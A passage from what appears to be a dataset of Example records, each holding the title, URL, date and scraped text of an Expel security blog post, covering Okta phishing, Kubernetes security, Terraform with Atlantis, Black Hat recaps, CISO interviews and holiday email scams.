unexpected login request, encourage them to report the event. They can do that either by email or using the reporting features within the 2FA mobile app. Customize your Okta sign-in page appearances. Believe it or not, were pretty good at pattern recognition. When implemented, if a user lands on a default Okta sign-in page with no customization, it may help trigger their spidey-sense and let them know that something isnt right. This incident serves as a reminder that we always need to stay sharp and think twice before clicking a link or hitting that sign-in button. Find out what Expel looks for when a phishing email is submitted'}) (input_keys={'title'}),
  Example({'title': 'Tell Dr. Kubernetes where it hurts - Expel', 'url': 'https://expel.com/blog/tell-dr-kubernetes-where-it-hurts/', 'date': 'Jan 26, 2023', 'contents': 'Subscribe  EXPEL BLOG Tell Dr. Kubernetes where it hurts Security operations  2 MIN READ  DAN WHALEN  JAN 26, 2023  TAGS: Cloud security Lets start with some numbers: The container application market is expected to grow to $12 billion by 2028 (a compound annual growth rate [CAGR]) of &gt;33%. Kubernetes (k8s) will drive a majority of the expansion. The container and Kubernetes security market projects to grow to $8.2B by 2030 (27.4% CAGR from 2021-2030). 96% of respondents to a 2021 Cloud Native Computing Foundation (CNCF) survey reported using or evaluating k8s. A RedHat survey found that 85% of IT leaders consider Kubernetes to be important or extremely important for their business. In other words, Kubernetes is exploding (in a good way). And for important reasons. It saves money. It improves DevOps efficiency. Workloads can be deployed in multicloud environments. It affords more portability and minimizes vendor lock-in. K8s schedules and automates container deployment across multiple compute nodes. It promotes app stability and availability in the cloud. And its fully open-source. As is the case for many (most? all?) new technologies, though, Kubernetes faces growing pains. That same RedHat report noted that 55% of DevOps, engineering and security teams had delayed applications because of security concerns and 93% experienced at least one security incident in their k8s environments in the last year. Top Kubernetes pain points Our customers have walked us through a number of issues they encounter, and three stand out. 1: Lack of coverage for Kubernetes environment. K8s applications are increasingly popular with application developers, but SecOps teams need coverage for every app, endpoint, network, and more  a huge requirement. With the rapid adoption of container applications through Kubernetes, these businesses now have a significant number of workload applications that arent proactively monitored  if theyre monitored at all. 2: Security as a business inhibitor versus enabler. No, this one isnt unique to k8s  the war between business and security seems old as time. And the basic dynamics make sense. Organizations want to innovate, move fast, and grow. Security teams want to prevent Bad Things from happening. Unfortunately, when cybersecurity is perceived as a drag on the business, the business often counters by circumventing security  which brings us back to Bad Things. In the case of Kubernetes, developers are deploying container apps and security isnt monitoring them. When security isnt integrated from the start, the entire business is exposed to significant risk. 3. Growing attack surface with limited security expertise. Another not-new problem made worse by k8s: hiring and retaining talent, something that has plagued the cybersecurity industry for a long time. The 2022 (ISC)2 Cybersecurity Workforce Study, released last October, found a global shortage of 3.4 million workers in the field  roughly equivalent to the population of Utah. With Kubernetes, the talent pool is even slimmer. 48% of respondents in a 2022 survey said the lack of in-house skills and limited manpower [is] the biggest obstacle to migrating to or using Kubernetes and containers So, security operations teams are underwater. They lack the time and resources to become experts on every new attack vector. Innovation and business demands associated with a hot new technology intensify the pressure, inducing a reactive approach to everything, weakened effectiveness across the board, fatigue, burnout, and mounting risk levels. Did we miss anything? Stay tuned to this space. We have some more useful analysis of the Kubernetes market, its benefits and challenges, and maybe even some ideas to help you better implement and manage your own strategy in the coming weeks. In the meantime, drop us a line with any questions.'}) (input_keys={'title'}),
  Example({'title': 'Terraforming a better engineering experience with Atlantis', 'url': 'https://expel.com/blog/terraforming-better-engineering-experience-with-atlantis/', 'date': 'Aug 4, 2020', 'contents': 'Subscribe  EXPEL BLOG Terraforming a better engineering experience with Atlantis Engineering  8 MIN READ  REILLY HERREWIG-POPE  AUG 4, 2020  TAGS: Cloud security / Get technical / How to / Managed security / Tools Wearing the engineering cap in a cloud-native environment means living in a world that revolves around open-source tech. Theres a dizzyingly vast ecosystem of powerful open source tools at our disposal, sure  but very few of them offer the ability to solve more abstract organizational challenges by themselves. When it comes to open-source tools, sometimes its like playing a game of Tetris  you have to figure out how to use and shift those tools to wind up with a winning development approach. Mastering open source Tetris is great, but whats even more important when it comes to developing anything is to truly understand the needs of your users. And if you can figure out not just what they need but how to provide them with a platform they can use to solve their own problems  thats when things start to get really exciting. In this post, Ill talk about why we at Expel realized it was time to reevaluate how users interact with our core engineering platform, our approach to building a system that makes our users happy (with the help of Terraform and Atlantis) and walk you through a hypothetical scenario of what our new system looks like from the users perspective. If you or your team are beginning to think about how to build a more robust Terraform execution pipeline, or you already have one and are looking at how to transform it into something more self-serviceable and palatable for end-users, then read on  this post might be for you! Core engineering platform vision At Expel, engineering is divided into feature teams. These feature teams own one or more services in their entirety. This includes developing the features, managing the CI/CD pipelines, managing the monitoring and owning the on-call rotation for their services. A site reliability engineers (SRE) role is to provide a platform that makes doing all of this easy. In fact, the core platform should make it so easy for a feature team to self-service provisioning their own cloud infrastructure that it would be less convenient to ask someone to do it for them. Platform plight A critical step to building any feature, let alone an entire platform, is incorporating user feedback into the development process. Towards the beginning of development, our users let us know that the process for managing GCP CloudSQL instances felt tedious and obtuse. They were right  it was. While teams were given the keys to control their own destiny, they were not equipped with much tooling to help them get there. They were forced to internalize the Terraform DSL well enough to write their own code, manage their own statefiles, rationalize IAM policy and spend time grokking the nuances of each providers implementation. This can feel like a lot of yak shaving when youre just looking for a darn database! And furthermore, we were seeing missed opportunities to apply SRE best-practices, patterns and guard rails to new infrastructure. For example, at Expel, SREs have developed a standard pattern for a Postgres CloudSQL slow query configuration that we think is usually a great idea to have enabled. But with our setup at the time, engineers did not have an easy way to inherit these benefits. Having users miss out on out-of-the-box database optimizations such as this would be no good! Any of this sound familiar? It was clear we needed some form of abstraction that would reduce the burden of Terraform development as well as package up SRE best practices into the code being written. We sat down to rethink our approach. Enter Atlantis and Expel modules What we knew we needed Okay, so we knew we needed to provide an easy way for engineers to manage their own cloud resources and monitors that would come with SREs cloud expertise out of the box. So what exactly were our requirements? Consumable abstraction for users: This is the tricky one! The platform needs to be easy to use. We need some form of central abstraction so that, as a platform user, I can set up everything I need without being forced to internalize how it all works under the hood. Infrastructure-as-code: This should probably go without saying, but all infrastructure changes must be managed via Git. While the benefits of the Infrastructure-as-Code philosophy are outside the scope of this post ( though heres a great overview by Hashicorp ), its worth calling out as a requirement. Completely automated: Its critical that automation drives all changes. Making infrastructure changes by executing code from an engineering workstation is widely discouraged for a number of reasons, including an increased attack surface, inconsistent code execution environments and lack of scalability. Auditability: We must be able to easily tie every infrastructure change to an individual user. What we chose After pulling our requirements together, this is the stack we chose to solve our problem: Terraform: We embrace Hashicorps Terraform for defining our entire Google Cloud and Datadog footprints. Atlantis: An open source Terraform workflow tool for teams . Atlantis enables teams to manage Terraform changes in an easy and familiar way. Expel Terraform modules: An internal collection of opinionated libraries supported by SRE that packages the most common infrastructure and monitoring needs into parameterized Terraform modules . Users love them because they can hit the ground running without requiring a deep understanding of low-level cloud intricacies. SRE loves them because we can enable self-service for our users while still ensuring our expertise carries over everywhere that changes are happening  even (and especially) when were not aware of them. GitHub: Where it all comes together. The Terraform code change management is not just tracked in GitHub, but the code execution itself is orchestrated through GitHub comments from the associated pull request (PR). Advantages and takeaways There are a host of advantages that the system provides our org. Heres what we love about it: Enables self-service for most common infrastructure needs. Theres no DevOps team waiting for you to throw a ticket over the wall to have your GCS bucket and service account provisioned. The process is only gated by how fast you can review and comment! No sacrifice is made to SRE best practices in exchange for the self-service model. Externalizing all of SREs common patterns and experience into documented, easy-to-use modules ensures that SRE expertise is packaged in with service owners deployments. Atlantis solves a common Terraform gotcha around scenarios involving multiple concurrent Terraform changes by implementing its own distributed locking mechanism. Atlantis will prevent any other proposed changes from being processed by applying its own special lock to any Terraform configuration that has an open PR against it. This allows users to work out of a branch and apply their change before its merged to master, which protects users from having to submit multiple PRs to solve `terraform apply` failures. In order to tee up another change, an engineer must either apply and merge the pull request, close it or manually release the lock via a special UI provided by Atlantis. Crazy visibility. While Git should be the source of truth for all changes regardless of how Terraform code is applied, having all orchestration happening out in the open in the PR fosters a healthy and transparent environment. By using the GitOps approach and ensuring only machines are executing our Terraform code, we reduce our attack surface by limiting the number of credentials and privileged hosts. Putting it all together As you can probably imagine, were always looking for new ways to enable our analysts and keep our customers safe. And since Expels backend is built using a microservice architecture, new applications get spun up all the time. Now were going to walk through a hypothetical end-to-end example to demonstrate how the process works as a platform user. In this scenario, well pretend for a moment that were software engineers spinning up a brand new service named `super-slick-service` that will benefit from using the open source software Redis. You can almost hear the (albeit contrived) conversation from the design meeting conference room: Jim: Hey! If our new app needs Redis, I heard GCP offers a managed Redis service called Memorystore. How can we go about sprinkling some of that on our app? Ali: I think SRE provides a Terraform module that we can use to provision that. Jim: Cool, but how can our app access the instance? Do we need to ask someone to set up DNS records for it? And how can we get some viz into instance health for things such as system capacity? Ali: The module sets up everything we need, including the DNS and Datadog monitors that will alert our team if were beginning to run into capacity issues. Just run through the doc  it should only take a few minutes. Pull up the core platform docs Okay, we know what we need to do. Now its time to stress the importance of platform documentation! Effective tools wont do nearly as good if its not clear how to harness their power. Check out this README for our Memorystore Terraform module: Core platform Terraform module documentation Call the module with your desired parameters Okay, so now weve pulled up the documentation and are going to invoke the Memorystore module and pass in just the basic bits that we need to specify. Were throwing the following code into our favorite IDE: Calling the Terraform Memorystore module Apply your change in GitHub via Atlantis Cool. So now we have our code and were submitting it via pull request in GitHub. Heres where the magic happens. Submitting the pull request A GitHub pull request submission to call our Terraform module Reviewing the plan output One of the most important steps in any Terraform workflow relies on the `terraform plan` feature. The `terraform plan` provides the user a snapshot of what Terraform would do in the event that it had been executed. It displays the delta between the desired state of your infrastructure as defined by your current commit versus its actual state provided by the providers API. This is a critical step in any Terraform workflow because while Terraform enables you to orchestrate impressive feats of progress, it in turn enables you to orchestrate impressive feats of destruction if you dont exercise great scrutiny upon your plan review. Luckily, this part is Atlantis bread and butter. Atlantis provides a wonderfully executed mechanism to sidestep the need for platform users to set up a local Terraform toolchain: GitHub comments! It does this by leveraging webhooks to allow GitHub users to execute Terraform via comments in the GitHub pull request. As long as youre authorized to operate on your application repo, youre able to harness the power of Terraform while dodging a whole category of headache that can come in the form of cumbersome state file management , mismatching Terraform and provider versions or brittle Terraform execution pipeline builds. Its a beautiful thing! Once your PR is submitted, Atlantis will manage the `terraform plan` on your behalf and submit the output for review in comment-form. Not only does this allow the author to review the proposed changes with minimal fuss, but it cranks up the visibility for the entire team to eleven since the plan output is dropped right in the PR! Terraform plan output as commented on our GitHub pull request via Atlantis Executing the change Great. Your code and `terraform plan` changes have been reviewed by team members and have been approved. Now how to put your change into effect? Just drop a comment in GitHub with an `atlantis apply` to pull the trigger on your change! And when the `atlantis apply` step is finally complete, you can count on a neat summary dropped in as  you guessed it  another GitHub comment! Sweet, now we can merge! Terraform apply output as commented on our GitHub pull request via Atlantis You can now see all the effects of your pull request being applied. Memorystore instance We have a brand new Memorystore instance, hot off the press: GCP Cloud Console reflecting our new Memorystore instance DNS record set A DNS A record has been provisioned for the instance: GCP Cloud Console reflecting our new DNS record Datadog monitor You can see here how our Datadog monitor query has been automatically scoped to our new instance ID: Datadog web console reflecting our new capacity monitor Measuring platform use Another important aspect to platform engineering is measuring user engagement. We want the platform to emit usage metrics wherever possible to help SREs understand how and when the platform is being used. In this case, we bake some telemetry into our modules by using local-exec provisioners that run from the Atlantis pod when modules are being invoked. Having this in place lets us look back in time to make more informed, data-driven decisions. Datadog web console reflecting module invocations over the past week Parting thoughts Delivering a useful platform can be challenging. If were steadfast in our commitment to remain engaged with our users as well as continuing to view technologies not as one-size-fits-all solutions, but as discrete tools meant to be assembled to create a powerful experience, we set ourselves up to build a successful platform that our users look forward to using. Want to find out more? Luke Jolly has kindly given back to the Atlantis community via the Atlantis contribution. You can see the conversation here . If you have any further questions, feel free to reach out to us !'}) (input_keys={'title'}),
  Example({'title': "That's a wrap! Top 3 takeaways from Black Hat", 'url': 'https://expel.com/blog/top-3-takeaways-from-black-hat-2022/', 'date': 'Aug 18, 2022', 'contents': 'Subscribe  EXPEL BLOG Thats a wrap! Top 3 takeaways from Black Hat Expel insider  3 MIN READ  KELLY FIEDLER  AUG 18, 2022  TAGS: Cloud security / Company news / MDR Even with Vegas in the rearview mirror, were still reeling from the excitement of our first time exhibiting at Black Hat USA. Mandalay Bay buzzed with the energy of a community nostalgic for its days at summer campHacker Summer Camp, that is. This years event felt especially energized with more people, exhibitors, and fun. Our friendly bots, Josie and Ruxie, joined us on the showfloor (plushies, anyone?), and we chatted with friends old and new about our approach to security. Then, through lots and lots of demos, we showed why we believe security can even be delightful. Now that the dust has settled and our suitcases are (mostly) unpacked, here are some of our big takeaways. 1. Having your head in the clouds might not be such a bad thing Cloud security continues to gain momentum as a hot conference topic across the industryand for good reason. In his keynote address, Chris Krebs of the Krebs Stamos Group, and former director of the Department of Homeland Securitys Cybersecurity and Infrastructure Security Agency (CISA), touched on the increasingly complex issue. He argued the pandemic drove an accelerated move to cloud infrastructures, creating larger ecosystems where productivity and ease tend to win over security. Cybercriminals understand this shift, so defenders must be ready. Its part of the reason we just released this handy guide to mapping the MITRE ATT&amp;CK Framework to Google Cloud Platform (GCP). Were sharing the lessons weve learned through our own investigations to help you and your team tackle GCP incident investigationsso we can take on the cloud, together. (And if youre operating in Amazon Web Services (AWS) or Azure, dont sweat itweve got you covered with our AWS Mind Map and Azure Guidebook .) 2. (Cyber) history repeats itselfits up to us to look for the signs. Kim Zetter, author and investigative journalist, reminded us that weve seen a lot of the same warning signs about cyber risk before. According to Zetter, the 2010 discovery of Stuxnet triggered a shift in cybercrimeopening the eyes of the community to the link between cybersecurity and national security. But despite the incredible advancements the industry has made since Stuxnet, many organizations still suffer from major, preventable incidents because they didnt heed the warning signs. At Expel, weve also seen this pattern of attackers relying on tried-and-true techniques across our customer base. Our recent research revealed a shift in pre-ransomware activity , as attackers opted for older techniques to combat new changes by Microsoft (more on this in our Expel Quarterly Threat Report ). Were seeing threat actors continue to use old techniques instead of adopting new ones. Why? Because it works. But theres a silver lining: if we continue information sharing across the growing community of cybersecurity defenders, then we have a better chance at seeing the writing on the wall and identifying signs of potential threats before they cause harm. (Hint: this is the goal behind our quarterly threat reports.) 3. Its going to take a village. Community reigned as the overarching theme of the week. This thread ran through keynotes and briefings alike, as this tight-knit community of defenders steadily grows alongside the threats we face. We heard from industry icons, including Jeff Moss, the founder of Black Hat himself, about the new team emerging when it comes to cybersecurity: the community of people using their roles in cybersecurity to improve the world. Moss noted that businesses responding to the Russian invasion of Ukraine demonstrated the cybersecurity industrys significant influence in the world, as some companies turned off access to their services or shut down their websites. The point? Were part of an influential community with the power to do some good in the worldbut its going to take us working together to get there. Now that its all said and done, were already counting down the days until its time to pack our bags and head back to camp! Ahead of the show, we shared the product advancements , resources, and capabilities weve been hard at work on, and we cant wait to keep the excitement rolling. Want to know more about how we do what we do? Reach out anytime .'}) (input_keys={'title'}),
  Example({'title': 'The CISO in 2020 (and beyond): A chat with Bruce Potter', 'url': 'https://expel.com/blog/ciso-in-2020-and-beyond-chat-with-bruce-potter/', 'date': 'Nov 23, 2020', 'contents': 'Subscribe  EXPEL BLOG The CISO in 2020 (and beyond): A chat with Bruce Potter Security operations  4 MIN READ  BRUCE POTTER  NOV 23, 2020  TAGS: CISO / MDR / Tech tools Youve probably run into a few headlines declaring that 2020 saw the rise of the CISO. Well, we agree. This year required all of us to step up to the plate and step outside of ourselves to meet completely unexpected and phenomenal challenges (were on a hiatus from using unprecedented). And in the tech world, we saw the role of the CISO evolve  pushing a member of the C-suite whos used to working behind the scenes to being front and center. Now that were finally reaching the end of 2020, were taking a moment to look back. So, I sat down (virtually) with Expels CISO, Bruce Potter, to reflect on this year  how we overcame the challenges it presented and what anyone in security should be thinking about as we enter a post-2020 world. There are many things that wont go back to being the way they were before 2020. Do you think the role of the CISO is one of those things? Yes. I think that coming out of 2020, CISOs will have a more central role in businesses. CISOs have been front and center in many organizations pandemic response. The ability to meet risk objectives while working remotely is the only way most businesses can continue to operate. And in the case of the CISO, that meant many of them had to complete remote work projects in days that would have otherwise taken years. The success of a companys remote work strategy is in large thanks to the work of the CISO. During my time as a CISO, Ive learned to focus more on rapid understanding of a problem and leveraging experts to get a solution out fast we can iterate on. It gets us better near term defenses and in the long run is less resource intensive. This is something every CISO needed to quickly master this year. I think security really is an enabler during COVID and many executives see that a good CISO can be a differentiator, not just something required for regulatory purposes. I expect CISOs to be elevated in org charts and be responsible for broader swaths of risk, not just cyber. Everyone wants to know  what are the biggest security threats we should be aware of? Social engineering. Far and away, thats what takes down companies. From the latest Twitter hack to some of the earliest attacks on the Internet, social engineering is still the number one way companies get compromised. Combined with ransomware tooling, the impact can be devastating. Were a long way off from solving this issue as we generally have poor authorization schemes in our organizations. Users tend to have far more access to data and systems than they need, but solutions to help with that are few and far between. Its clear that orgs cant get away with not taking security seriously. What did you include in your 2021 planning? Were focusing on three major areas for 2021: 1. Product and software security. Looking beyond the security of your enterprise and focusing on the security of the services and products you are developing is an important part of the overall security of an organization, but sometimes it falls outside the scope of the CISOs role. In our case, its squarely my responsibility and its a huge focus for us in 2021. 2. Formalized risk management. Paying attention to security tech is only one part of a functional security program. Having formalized processes around security and privacy risk management is a function that is often more seat of the pants than a formalized thing. Were working to codify our risk management processes to make our risk management a more repeatable and efficient process. One thing well continue to do here: Not rely on vendors to tell you what questions to ask when it comes to assessing third-party risk. Weve developed our own third-party questionnaire and narrowed it down to 10 (what we think are really good) questions. 3. Cloud authorization. Were cloud native so it means were all cloud all the time and as much as we have sign-on signal (SSO)  we dont have centralized fine grained access control to cloud services. We have to configure authorization for each service, which doesnt scale (obviously). Its time to fix it. Expel recently gained ISO/IEC 27001:2013 certification and integrated the ISO/IEC 27701:2019 extension to our certification. Does this mean that all orgs should do this? The simple answer is maybe. It depends on if your customers care about how secure you are. The answer for a law firm (as an example) vs. a SaaS provider is probably very different. When youre providing online services, you need to be able to express to your customers, in a very believable way: We know what were doing from a security perspective. Theres a lot that goes into that, including transparency in operations, having good processes and procedures and having an architecture that lends itself to securely handling customer data. ISO27001 and ISO27701 are great certifications that can help you demonstrate this to customers. While certifications arent the be-all-end-all when it comes to building trust, theyre a fantastic starting point. Looking back at the dumpster fire that is 2020  are there any lessons that you couldnt anticipate needing to learn but you will now keep in your toolbox moving forward? I couldnt anticipate that one day Id need to get every single member of my company working fully remote within a 72-hour timeframe. We ended up spending a lot of the year being concerned about our employees, their welfare and the quality and security of their home networks. Being successful in 2020 required having a very personal touch and view of our security controls. I think keeping that customer focus going forward will allow us to have low-friction security solutions that people dont work around or ignore. Its safe to say that CISOs were in pretty high demand when it came to interviews. Is there a question you wish someone asked you this year but didnt? How has productivity and innovation been impacted by working from home? It may seem like a CIO or COO type question, but I think security has a big impact on this as well. The security controls in place when collaborating in person (say in a conference room) vs. remotely (Zoom? Slack? Virtual whiteboard?) are very different. Ensuring that your security program is not getting in the way of collaboration and productivity is very important. Ideally, your security program enables collaboration and productivity. Ensuring your actions as a CISO are aligned to the business needs, not just business security needs, can be a real differentiator this year. Lets hear it for the CISOs! Seriously, thank you. To say that working through this year wasnt easy is an egregious understatement. Were appreciative of Bruce  and our entire Expel team  for never skipping a beat when it comes to keeping our customers and our Expletives safe. We hope these insights are helpful to you as you complete your 2021 planning. Do you have any burning questions that we didnt cover? Wed love to hear them !'}) (input_keys={'title'}),
  Example({'title': 'The Cycle Continues: Black Hat USA 2022  Day 2 Recap', 'url': 'https://expel.com/blog/black-hat-usa-2022-day-2-recap/', 'date': 'Aug 12, 2022', 'contents': 'Subscribe  EXPEL BLOG The Cycle Continues: Black Hat USA 2022  Day 2 Recap Expel insider  3 MIN READ  ANDY RODGER  AUG 12, 2022  TAGS: Company news Black Hat USA 2022 has officially wrapped, and the attendees will soon leave the heat of Las Vegas behind to go back to their organizations with some fresh perspectives on fighting the good fight. The day 1 theme of community was prevalent from the get-go again today, starting with the keynote address. Once again, Jeff Moss kicked things off, addressing the evolving relationship the Black Hat community has with the media. Moss pointed out that Black Hat has always been about bringing new voices to the infosec community and that includes the press. Unfortunately, the press hasnt always been so kind to the group, resulting in a love/hate relationship. Like any organization, Moss pointed out, a good media interview can result in showcasing the communitys great work and educating the public about cybersecurity topics, while a bad interview can cast its work in a negative light or perpetuate the criminal hacker stereotype. Thankfully, as cybersecurity issues have become more mainstream, the communitys relationship with the press has evolved in a positive way. Moss then welcomed to the stage, Kim Zetter, an author and investigative journalist with an impressive rsum that includes cybersecurity writing roles at WIRED, the New York Times Magazine, the Washington Post, Yahoo! News, Vice Magazine, and more. One would be hard-pressed to find a more appropriate journalist to address the Black Hat crowd. Zetter explained that in the beginning of her career, cybersecurity reporters almost exclusively worked for tech press. The mainstream media would assign a general reporter to the story only when a major incident occurred. Over the last 10 years or so, the major news outlets woke up and realized the importance of hiring reporters to translate security to the general public. Zetters presentation, titled Pre-Stuxnet, Post-Stuxnet: Everything Has Changed, Nothing Has Changed, examined decades of cybersecurity developments, including the lead-up to the Stuxnet discovery in 2010. That discovery opened the eyes of the security community to a sector it previously ignored: the operational networks and industrial control systems that manage critical infrastructure. This was when cybersecurity became linked to national security. Since Stuxnet, the cybersecurity industry has made tremendous strides. Security technology is far more advanced than in 2010, and despite all their work, organizations still suffer from incidents that have major consequences-and that were totally predictable (we might even say preventable). Zetter explained that organizations will always experience incidents that no one saw coming, but they could foreshadow more incidents before they occur. So while its important that we look back at the history of watershed cybersecurity events, we must also watch for the signs of whats to comeand take the proper precautions to prepare now. This sentiment was presentalbeit to a lesser degreein the session by Nathan Hamiel titled, From Hackathon to Hacked!: Web3s Security Journey. This presentation examined the security maturity of Web3 projects, built on blockchain technology. While the tech community recognizes the term Web3, its still an emerging technology with some kinks to work out. When combined with the fact that small teams, with no security systems or safeguards in place, run many of the Web3 projects, these projects become juicy targets for cyber criminals. Even though Web3 is still such a nascent space, it faces a lot of the same challenges as the nations critical infrastructure. There are basic security best practices that both areas still dont follow. And this is true across the business landscape. At Expel, we often see companies not applying patches, or lacking simple email filters to reduce phishing attempts, or misconfiguring their cloud settings. So what should we as an industry do? It comes back to community. We should heed the advice of Kim Zetter, and pay close attention to the warnings of impending vulnerabilities and ransomware attacks to sense whats coming, and take the appropriate steps to prepare. Security challenges are only increasing in sophistication and frequency, and we cant wait for major incidents to happen before dealing with them. While this all sounds very dire, if Black Hat USA 2022 showed anything, its that this community is able to meet these challenges head on, and usher in a new age of security.'}) (input_keys={'title'}),
  Example({'title': "The dinner that started it all with Expel's new CISO", 'url': 'https://expel.com/blog/the-dinner-that-started-it-all-with-expels-new-ciso/', 'date': 'Apr 12, 2022', 'contents': 'Subscribe  EXPEL BLOG The dinner that started it all with Expels new CISO Talent  3 MIN READ  GREG NOTCH  APR 12, 2022  TAGS: Company news Expel recently welcomed a new face to the executive team with the addition of Greg Notch as Chief Information Security Officer (CISO). Fresh off of 15 years as CISO and Senior Vice President of Technology at the National Hockey League (NHL), Greg has been in the security and tech biz for over 20 years  helping companies large and small through all three dot-com booms. As Expels CISO, he ensures the security of our systems, and keeps customers educated on the threat landscape and latest techniques for mitigating risk in their environments. In this post, get to know Greg and what drew him to Expel, in his own words. The dilemma A little over five years ago, my company tasked me with building our information security program. As I sat in my office, I faced a seemingly impossible problem: the current approach to info security programs involved solving several complex problems simultaneously. Conventional thinking for an enterprise security program said you first had to buy a bunch of security tools and gather logs from the tools and the rest of your environment. Then you bought a security information and event management (SIEM) tool and jammed in all that data. Next, you hired and staffed a security operations center (SOC) team to sift through the data and respond to what they found. Honestly, that sounded terrible. This solution created two other problems to solve: how to manage all those tools and data, and how to staff the organization that would deliver actions and outcomes from the pile of data. Both are difficult, but building a SOC with the expertise and experience necessary to handle it can be especially daunting. Not to mention, if you wanted it to be a 247 operation, it involved hiring somewhere between eight and 12 people. The only obvious alternative was to outsource this entirely to a company that would make all the technical and staffing decisions for you. But the players in the market at the time werent making decisions based on individual customer needs; they were focused on what was economical for them to provide as a service. After several conversations with peers who used these services, it appeared that none of those services took any context from the customer, which meant endless reams of meaningless alerts from your own tools  usually at a substantial cost. Spoiler alert: None of these options sounded appealing. Id worked with venture-backed businesses previously, so this gap in the market seemed to me like a good opportunity to reach out to my venture capitalist (VC) friends for advice. In my experience, venture-backed businesses are a successful way to solve problems the market isnt adequately addressing. When successful, this approach has the added virtue of being to everyones benefit (my security program, the company, and the venture backers). I began expressing my exasperation to VC folks, explaining that there must be a better way and asking, Why isnt there a platform to solve this problem at scale? Most responded that it was an industry-wide dilemma, and that it likely wasnt solvable  at least not with software. The path to Expel Somewhat dejected but undeterred, I headed off to D.C. for a security conference. There, one of my VC friends set up a meeting with folks who may be trying to solve that problem you keep pestering us about. Intrigued, I met Expels co-founders Yanek, Merk, and Justin for dinner and the rest is, well, the stuff of legends. They saw the same problem and had a compelling plan for how to solve it. At the end of the meal, I remember asking them: So when can you start? To which they responded, We should probably set up a company first. That company was, of course, Expel. Since then, Ive watched as they built an amazing team and company, founded on core values and a culture that I didnt think was possible. They delivered on every commitment, big or small, and every interaction I had with the Expel team was thoughtful, humble, and relentlessly customer-driven. The values permeated the entire company, and I saw that it was the sort of place where anyone would be lucky to work. Now I have the distinct privilege of joining that team, and becoming an Expletive. Im looking forward to continuing the journey.'}) (input_keys={'title'}),
  Example({'title': 'The Grinchy email scams to watch out for this holiday season', 'url': 'https://expel.com/blog/the-grinchy-email-scams-to-watch-out-for-this-holiday-season/', 'date': 'Nov 22, 2021', 'contents': 'Subscribe  EXPEL BLOG The Grinchy email scams to watch out for this holiday season Security operations  9 MIN READ  RAY PUGH  NOV 22, 2021  TAGS: MDR As the holidays near, theres so much to excite! Its that time of year, with sales left and right. Cheer fills the air and theres no time to wait For holiday shopping  dont want to be late! But as you shop online and check email this season, Watch out for these scams  with very good reason. With celebrations and work and no spare time to mention, Dont let Grinches in while not paying attention. They want to steal info and data galore, Gift cards, credentials, and so much more. So heres what to know to avoid falling prey  Keep your inbox secure through these holidays. Who ordered all that Who Hash ?!?! Aka: Fake shipping notifications Our security operations center (SOC) saw several of these scams, and we expect them to ramp up around the holidays. Holiday Grinches (aka attackers) send fake shipping notifications, often posing as legitimate retailers, hoping to trick recipients into providing personal information like card numbers, login credentials, or other details. For example, we investigated this fake Amazon notification earlier this year, which claimed an order was on its way to the recipient. Fake Amazon shipping notification email The attackers goal is to make the recipient think this is an actual order incorrectly placed through their account (or that maybe their account was hacked), with the large dollar amount (over $1,400 in this case) causing concern that the recipient will be stuck with the bill for an item they didnt order. There are no clickable links in the email, which steers the reader to the Support Desk phone number listed in bright red at the bottom. Our Grinchy sender hopes recipients will call that number to dispute the order, then poses as customer service on the phone to ask for necessary account information to help the recipient sort out the issue. If successful, this type of scam would result in the attacker obtaining account credentials, credit card numbers, or other sensitive personal information from the concerned recipient. These fake shipping notices are a common attacker tactic  see another example below where a fake shipping notice prompted the recipient to click a link and provide personal information to reschedule a canceled delivery. Fake shipping notification email The holiday season is a perfect time for would-be Grinches to raise their odds for success with these tactics as online shopping reaches peak levels for the year. A Whos to-dos: Got an email about an order or delivery you didnt place? Shipping confirmation that looks kind of sketchy? Here are some things you can do to avoid falling prey to this Grinchy scam: Double check the email address the shipping/delivery notice came from. Does it look legitimate? Does it match other shipping confirmation emails youve previously received from the same company for orders you placed? If not  its likely a scam. Check the email for errors  is the companys name or other text misspelled? Is the language odd or stilted? These could be signs that the email isnt legitimate since companies go to great lengths to make sure their emails are largely error-free. If you have any suspicions that an email might not be legit, dont click any links or call the phone number provided in the email  and definitely dont give them any of your personal information! Instead, look up the verified customer service number for that company online and go through their legitimate support center to look into the order or delivery. If they cant find it, its a good sign it was a scam. Thats not Santa  thats the Grinch! Aka: CEO impersonation The TL;DR for this one: unless its a regular part of your job, its probably safe to assume your boss wouldnt ask you to do her holiday shopping. We see a number of campaigns come through our SOC every year where Grinches dress up like Santa and try to rope employees into helping them steal all the gifts (or gift cards, in this case). For example, in the email below, our Grinch created an email address imitating that of the companys CEO and targeted a company employee, asking to speak offline about a personal errand. CEO impersonation email request Attackers often like to move the conversation away from email to lower the chance of being discovered. Asking for cell phone numbers allows them to use calls or texting for further interactions. Weve seen similar emails with language like: Send me your cell phone number for an urgent task Kindly reconfirm your cell phone #, I need a task done immediately Please kindly resend your cell phone number to me Our gift-stealing Grinches then usually ask their victims to purchase gift cards and send pictures of the redemption codes. Communicating by text/smartphone makes receiving that info quick, easy, accessible, and fairly anonymous. And the victim is then out the money they spent on the gift cards with little recourse to get it back. Attackers often use publicly-available information like org charts on a companys website or networking sites like LinkedIn to perform reconnaissance and target individuals who are newer to the company and likely eager to impress their boss. Which means, historically, weve seen interns, new graduates, and other new hires frequently targeted in these scams. So what can you do to keep the cyber Grinches from looking like this ? A Whos to-dos: If you receive an unexpected email from your boss asking you to contact them offline or purchase things for them that arent part of your regular responsibilities, first: dont respond or give them your number! Second, contact your boss through another channel of communication like your companys instant messaging app, a new email to their verified company email address, or a phone call if you have their number. Confirm whether they sent the request. If not, it was likely a scam and you should report it to your companys IT/security team. If the person reaching out isnt someone you normally talk to, find someone in your network who can reach them through legitimate channels. Click this link to see your Whobilation invite! Aka: Credential harvesting through phishing The hustle and bustle of the holiday season is perfect timing for another Grinchy favorite  catching busy Whos off-guard with phishing emails posing as legitimate business activities to harvest recipients login credentials. A common tactic is for attackers to send an email pretending to share a legit business document (an invoice that needs signing, a contract, etc.) through a file-sharing application like DocuSign, Microsoft OneDrive, or Microsoft Office365. The link in the phishing email then takes the recipient to a credential harvesting portal posing as a login page for one of those file-sharing services. When the recipient enters their login info to access the document, the attacker captures that information and can then use it to access that recipients inbox (and potentially other parts of an orgs systems and applications if business email credentials are captured). Below is an example of a fake login portal weve seen. There are often subtle differences (like typos, missing or different images, abnormal language) between these fake portals and the real login pages, but attackers hope busy employees wont stop and notice these abnormalities. Credential harvesting page posing as a Microsoft login page This page may look legit at first glance, but the URL in the browser shows that this is definitely not a Microsoft-owned page. Another common tactic Grinches use to collect credentials is sending recipients a PDF file to download (again posing as a legitimate 